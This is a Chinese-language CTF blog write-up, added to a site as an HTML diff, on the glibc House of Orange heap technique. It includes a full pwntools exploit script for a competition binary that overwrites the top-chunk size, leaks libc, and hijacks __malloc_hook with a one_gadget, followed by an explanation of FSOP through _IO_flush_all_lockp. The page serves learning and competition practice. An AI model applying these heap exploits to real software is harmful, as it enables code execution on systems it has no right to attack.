@@ -1,0 +1,524 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>House of orange - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、第一种类型的原理House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">House of orange</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/House-of-orange/" title="House of orange" class="">House of orange</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    21k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    19 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/house%E5%AE%B6%E6%97%8F/" rel="tag">house家族</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h4 id="一、第一种类型的原理"><a href="#一、第一种类型的原理" class="headerlink" title="一、第一种类型的原理"></a>一、第一种类型的原理</h4><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
+<a id="more"></a>
+
+<p>这里用代码解释下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">malloc(size)</span><br><span class="line"><span class="keyword">if</span> size&gt;topchunk_size:</span><br><span class="line">    free(topchunk)<span class="comment">#放到unsorted bin中</span></span><br><span class="line">    mmap(size)<span class="comment">#得到非主分配区的堆地址</span></span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    nothing</span><br></pre></td></tr></table></figure>
+
+<p>然后unsorted bin就可以拿来切割了，后面的操作看具体情况而定。</p>
+<p>一般来说，topchunk都是很大的，通过malloc去消耗topchunk，显然不现实。但是呢，我们可以通过溢出修改topchunk的大小，但是topchunk的size有挺多检查的，所以要小心点改，要满足以下要求：</p>
+<ol>
+<li>伪造的 size 必须要对齐到内存页</li>
+</ol>
+<p>2.size 要大于 MINSIZE(0x10)</p>
+<p>3.size 要小于之后申请的 chunk size + MINSIZE(0x10)</p>
+<p>4.size 的 prev inuse 位必须为 1</p>
+<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中，即：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+
+<p>topchunk内存页对齐，size &gt; topchunk_size &gt; 0x10, pre_used位为1</p>
+<p>重点是这个页对齐，一般来说操作系统都是对于4kb对齐的，</p>
+<p>例如，topchunk的地址是0x602020，topchunksize为0x20fe0，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的，因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size，一般选取的是0xfe1。</p>
+<p>看一道题：巅峰极客一道pwn题：</p>
+<p><img src="/blog_img/1572068614945.png" alt="57206861494"></p>
+<p>漏洞很明显，一个UAF，一个溢出7字节的edit，而且申请的size为小于0x1000，有打印函数，但是只有一个chunk可以操作，想要泄露地址，一般情况下是要堆去阻隔，但是house of orange真好，可以实现放入unsorted bin中，而且还有残留地址，所以这题直接可以打了，先分析下：</p>
+<p>首先页对齐要求，先看下tpochunk大小：0x20f91</p>
+<p><img src="/blog_img/1572068888221.png" alt="57206888822"></p>
+<p>根据惯例：</p>
+<p><img src="/blog_img/1572068953994.png" alt="57206895399"></p>
+<p>所以取后三位得到fake_topchunksize:  0xf91</p>
+<p>修改并释放出来：malloc(0xf98)</p>
+<p><img src="/blog_img/1572069093803.png" alt="57206909380"></p>
+<p>house of orange 成功了，接着就是UAF漏洞利用了，申请0x68，泄露地址+写入fake_chunk，改写malloc_hook即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn666'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn666'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'55fca716.gamectf.com'</span>,<span class="number">37009</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice &gt; "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Size &gt; "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Content &gt; "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice &gt; "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice &gt; "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Size &gt; "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Content &gt; "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice &gt; "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"What's your name?"</span>)</span><br><span class="line">sl(<span class="string">'king'</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x68</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x68</span> + p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="number">0x68</span>+<span class="number">8</span>,py)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">malloc(<span class="number">0xf98</span>,<span class="string">'b'</span>*<span class="number">0xf98</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c5188</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span> + hex(libc_base)</span><br><span class="line">fake_chunk = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>] - <span class="number">0x23</span></span><br><span class="line">onegadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">free()</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += p64(fake_chunk)</span><br><span class="line">edit(<span class="number">0x68</span>+<span class="number">8</span>,py)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x68</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x13</span> + p64(onegadget)</span><br><span class="line">malloc(<span class="number">0x68</span>,py)</span><br><span class="line">ru(<span class="string">"Your choice &gt; "</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">"Size &gt; "</span>)</span><br><span class="line">sl(<span class="string">'200'</span>)</span><br><span class="line"><span class="comment">#'flag&#123;7952ade8da0821a4e2334dd2ad307ac7&#125;'</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="所以以后可以想想，一个堆块泄露地址，没人帮你阻隔时，house-of-orange！"><a href="#所以以后可以想想，一个堆块泄露地址，没人帮你阻隔时，house-of-orange！" class="headerlink" title="所以以后可以想想，一个堆块泄露地址，没人帮你阻隔时，house of orange！"></a>所以以后可以想想，一个堆块泄露地址，没人帮你阻隔时，house of orange！</h5><h4 id="二、第二种类型的原理"><a href="#二、第二种类型的原理" class="headerlink" title="二、第二种类型的原理"></a>二、第二种类型的原理</h4><p>来看pwnable.tw的一道题：</p>
+<p><img src="/blog_img/image-20200527214017360.png" alt="image-20200527214017360"></p>
+<p>典型的没有free的情况，这里我们需要通过house of orange实现getshell操作，分析下漏洞点：</p>
+<p><img src="/blog_img/image-20200527213945185.png" alt="image-20200527213945185"></p>
+<p>这里根据0截断的知识，我们可以知道，通过下一个chunk的size紧密相连，我们能更新当前堆块的size，再次edit时就是溢出了，这里我们第一个块是接近topchunk的，所以可以实现把topchunk给free出来。</p>
+<p>再看看malloc</p>
+<p><img src="/blog_img/image-20200527214306702.png" alt="image-20200527214306702"></p>
+<p>会发现检查条件是2者需要同时成立时，即i&lt;=8&amp;&amp;chunk[i]==0才能申请出堆块,但是通过看其他函数，发现只能操作8个堆块，也就是i的极限是7，而不是8，意味着可能可以申请出第9个堆块，看下布局：</p>
+<p><img src="/blog_img/image-20200527214654385.png" alt="image-20200527214654385"></p>
+<p>由于是一一对应的，当我们把chunk[0]的size利用edit更新为0时，那么我们就可以绕过那个条件，申请出第九个堆块，放到chunk[0]的size位置，这样就是相当于超级溢出了，直接覆盖unsorted bin实现house of orange操作。</p>
+<p>伪造整个结构体！下面介绍这一种方法，由上面的方法，我们可以通过改topchunk实现free操作把topchunk给放到unsortedbin中，然后再次申请堆块就可以得到真实地址，这里只要再次申请的堆块大于0x20，就可以同时得到堆地址，比如我再次申请是0x68大小：</p>
+<p><img src="/blog_img/image-20200527213736499.png" alt="image-20200527213729055"></p>
+<p>所以一步操作即可泄露真实地址，也可以泄漏堆地址。</p>
+<p>接着我们通过刚刚的超级溢出，实现覆盖我们的house of orange代码：</p>
+<p><img src="/blog_img/image-20200527222216797.png" alt="image-20200527222216797"></p>
+<p>这里讲下原理：</p>
+<h5 id="File-Stream-Oriented-Programming"><a href="#File-Stream-Oriented-Programming" class="headerlink" title="File Stream Oriented Programming"></a>File Stream Oriented Programming</h5><p>我们知道有<code>rop</code>即<code>retn Oriented Programming</code>，那么其实<code>File Stream Oriented Programming</code>是一个道理的。也是一种劫持程序流程的方法，只不过方式是通过攻击<code>File Stream</code>来实现罢了。<br>我们先要了解<code>malloc</code>对错误信息的处理过程,<code>malloc_printerr</code>是<code>malloc</code>中用来打印错误的函数。</p>
+<p><img src="/blog_img/image-20200527215651735.png" alt="image-20200527215651735"></p>
+<p><code>malloc_printerr</code>其实是调用<code>__libc_message</code>函数之后调用<code>abort</code>函数，<code>abort</code>函数其中调用了<code>_IO_flush_all_lockp</code>，这个函数调用涉及到io_stderr结构体，也就是说一定会用到io_stderr里面的vtable跳转到想要执行的函数，即采用的是虚表调用的方式。</p>
+<p>通过unsorted bin的attack，我们的io_file_all会被修改成指向top_chunk的main arena。</p>
+<p>但是我们是无法控制<code>main_arena</code>的内容的，至少全部控制是不行的，那么怎么处理呢？<br>这里还是要牵扯到<code>io_file</code>的使用，<code>IO_FILE</code>结构中有一个字段是<code>chian</code>字段，它位于0x60偏移处,他指向的是下一个<code>IO_FILE</code>结构体，我们如果可以控制这个字段，就再次指定<code>io_file</code>的位置，它相当于是一个链表的结构<br>这样的话又联系到<code>smallchunk</code>的问题，在拆卸unsort_bin时候对属于<code>small_bin</code>的chunk进行了记录操作。<br>这个时候<code>IO_FILE_all</code>指向的正是<code>main_arena</code>的bins里面<code>unsortbin</code>的位置，那么偏移<code>0x60</code>处正好是，<code>smallchunk</code>的index为6的地方，也就是满足大小为<code>16*6</code>（0x61）的chunk，所以我们需要把unsortbin的大小设置为<code>0x60</code>大小，这样就会放到我们的small bin中。</p>
+<p><img src="/blog_img/image-20200527224402825.png" alt="image-20200527224402825"></p>
+<p><img src="/blog_img/image-20200527224531550.png" alt="image-20200527224531550"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">…</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    ...</span><br><span class="line">          <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>
+
+<p>因为第一个分配在<code>main_arena</code>的<code>IO_FILE_plus</code>结构的<code>fp-&gt;mode</code>等值不符合要求，就会通过<code>chains</code>跳转到就下一个<code>IO_FILE_plus</code>就是我们之前设置的<code>unsortbin</code>，然后需要满足一下条件</p>
+<ol>
+<li>fp-&gt;mode&gt;0</li>
+<li>_IO_vtable_offset (fp) ==0</li>
+<li>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base<br>这里的话我就是把wide_data的<code>IO_wirte_ptr</code>就指向<code>read_end</code>就可以,然后就会调用虚表vtable+0x18偏移处的函数了。</li>
+</ol>
+<p><img src="/blog_img/image-20200527220258290.png" alt="image-20200527220258290"></p>
+<p>一个实际跟踪的例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">f <span class="number">0</span>     <span class="number">7f</span>2af059f390 system</span><br><span class="line">f <span class="number">1</span>     <span class="number">7f</span>2af05d6fb8 _IO_str_finish+<span class="number">24</span></span><br><span class="line">f <span class="number">2</span>     <span class="number">7f</span>2af05d6196 _IO_flush_all_lockp+<span class="number">374</span></span><br><span class="line">f <span class="number">3</span>     <span class="number">7f</span>2af0590fbd <span class="built_in">abort</span>+<span class="number">253</span></span><br><span class="line">f <span class="number">4</span>     <span class="number">7f</span>2af05d17ea</span><br><span class="line">f <span class="number">5</span>     <span class="number">7f</span>2af05dc13e _int_malloc+<span class="number">1470</span></span><br><span class="line">f <span class="number">6</span>     <span class="number">7f</span>2af05dc13e _int_malloc+<span class="number">1470</span></span><br><span class="line">f <span class="number">7</span>     <span class="number">7f</span>2af05de184 <span class="built_in">malloc</span>+<span class="number">84</span></span><br><span class="line">f <span class="number">8</span>           <span class="number">400</span>a03</span><br><span class="line">f <span class="number">9</span>           <span class="number">400</span>d12</span><br><span class="line">f <span class="number">10</span>     <span class="number">7f</span>2af057a830 __libc_start_main+<span class="number">240</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/image-20200527233014694.png" alt="image-20200527233014694"></p>
+<p><img src="/blog_img/image-20200527233039120.png" alt="image-20200527233039120"></p>
+<p><img src="/blog_img/image-20200527233258560.png" alt="image-20200527233258560"></p>
+<p>这里其实有点不太懂system是怎么被调用到的，以后再看看吧～同时，这里house of orange其实是有概率会失败的，因为不能保证那个约束条件一定是成立的～</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
